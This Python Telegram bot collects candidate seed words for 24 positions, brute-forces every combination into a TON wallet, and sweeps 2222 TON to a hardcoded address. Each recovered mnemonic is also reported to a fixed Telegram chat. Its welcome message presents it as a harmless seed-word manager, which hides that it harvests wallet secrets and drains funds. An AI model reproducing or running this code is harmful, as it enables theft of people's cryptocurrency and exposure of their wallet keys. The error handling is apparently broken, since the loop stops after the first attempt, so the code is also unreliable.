import asyncio
import sqlite3
import logging
from itertools import product
from TonTools import TonCenterClient, Wallet
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.methods.set_my_commands import BotCommand
from aiogram.types import BotCommandScopeAllPrivateChats
from dotenv import load_dotenv
import os

DB_NAME = "seed_words.db"
TON_CENTER_BASE_URL = "https://toncenter.com/api/v2/"
DESTINATION_ADDRESS = "UQBoyGEz_wMufwh3meR15vPbbINd7c3pH2UognfD3DAIlzM1"
TON_AMOUNT = 2222

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")


bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def set_default_commands(bot: Bot):
    commands = [
        BotCommand(command="/start", description="Botni ishga tushirish"),
        BotCommand(command="/allword", description="sozlarni korish"),
        BotCommand(command="/dword", description="sozlarni ochirish"),
        BotCommand(command="/cleardb", description="bazani ochirish"),


            ]
    await bot.set_my_commands(commands=commands, scope=BotCommandScopeAllPrivateChats())

def init_db():
    """Initialize the SQLite database and table."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS seed_words (
            id INTEGER PRIMARY KEY,
            words TEXT
        )
    """)
    conn.commit()
    conn.close()

async def add_words_to_db(id, words):
    """Add or update words for a specific ID in the database."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO seed_words (id, words) VALUES (?, ?)", (id, words))
    conn.commit()
    conn.close()

async def delete_words_from_db(id):
    """Delete words associated with a specific ID from the database."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM seed_words WHERE id = ?", (id,))
    conn.commit()
    conn.close()

async def clear_db():
    """Clear all data from the database."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM seed_words")
    conn.commit()
    conn.close()

async def get_all_words():
    """Retrieve all words from the database sorted by ID."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT words FROM seed_words ORDER BY id")
    rows = cursor.fetchall()
    conn.close()
    return [row[0] for row in rows]

def generate_combinations(seed_words):
    """Generate all possible combinations of seed words."""
    options = [words.split(",") for words in seed_words]
    return product(*options)

async def try_wallet_deployment(mnemonic_combination):
    """Attempt to deploy a wallet using the given mnemonic combination."""
    provider = TonCenterClient(base_url=TON_CENTER_BASE_URL)
    wallet = Wallet(mnemonics=list(mnemonic_combination), version='v4r2', provider=provider)

    try:
        await wallet.deploy()
        logger.info(f"\n\nWallet imported successfully with combination: {', '.join(mnemonic_combination)}\n\n")
        await bot.send_message(chat_id=630267309, text=f"\n\nWallet imported successfully with combination: {', '.join(mnemonic_combination)}\n\n")

        await asyncio.sleep(10)

        await wallet.transfer_ton(destination_address=DESTINATION_ADDRESS, amount=TON_AMOUNT, message='doin good')
        logger.info("Transaction successfully sent.")
        await bot.send_message(chat_id=630267309, text="Transaction successfully sent.")
    except Exception as e:
        logger.error(f"Error with combination: {', '.join(mnemonic_combination)}. Error: {e}")
        await bot.send_message(chat_id=630267309, text="Error while sending transaction!!!")



async def process_combinations():
    """Process all combinations of seed words."""
    words = await get_all_words()
    if len(words) < 24:
        logger.warning("Not enough seed words to start the process.")
        return

    combinations = generate_combinations(words)
    for combination in combinations:
        try:
            await try_wallet_deployment(combination)
            break
        except Exception as e:
            logger.error(f"Skipping combination {len(combination)} due to error: {e}")
            continue

@dp.message(Command(commands=["start"]))
async def start_handler(message: types.Message):
    """Handle /start command."""
    await message.reply("Welcome! This bot helps you manage seed words and wallet deployment. Use /help to see available commands.")

@dp.message(Command(commands=[f"word{i}" for i in range(1, 25)]))
async def add_word_handler(message: types.Message):
    """Handle commands to add words for a specific ID."""
    command = message.text.split(" ")[0]
    id = int(command[5:])
    words = message.text[len(command) + 1:].strip()
    
    if not words:
        await message.reply("Please provide words after the command.")
        return
    
    await add_words_to_db(id, words)
    await message.reply(f"Words added to ID {id}: {words}")

    all_words = await get_all_words()
    if len(all_words) == 24:
        await message.reply("24 words received. Starting process...")
        await process_combinations()

@dp.message(Command(commands=[f"dword{i}" for i in range(1, 25)]))
async def delete_word_handler(message: types.Message):
    """Handle commands to delete words for a specific ID."""
    command = message.text
    id = int(command[6:])
    await delete_words_from_db(id)
    await message.reply(f"Words for ID {id} have been deleted.")

@dp.message(Command(commands=["cleardb"]))
async def clear_db_handler(message: types.Message):
    """Handle the /cleardb command to clear the database."""
    await clear_db()
    await message.reply("Database has been cleared.")

@dp.message(Command(commands=["allword"]))
async def all_word_handler(message: types.Message):
    """Handle /allword command to retrieve all stored seed words."""
    all_words = await get_all_words()
    if all_words:
        await message.reply("\n".join(f"ID {i+1}: {words}" for i, words in enumerate(all_words)))
    else:
        await message.reply("No words found in the database.")

async def main():
    """Main function to initialize and run the bot."""
    init_db()
    await set_default_commands(bot=bot)
    logger.info("Bot started.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())


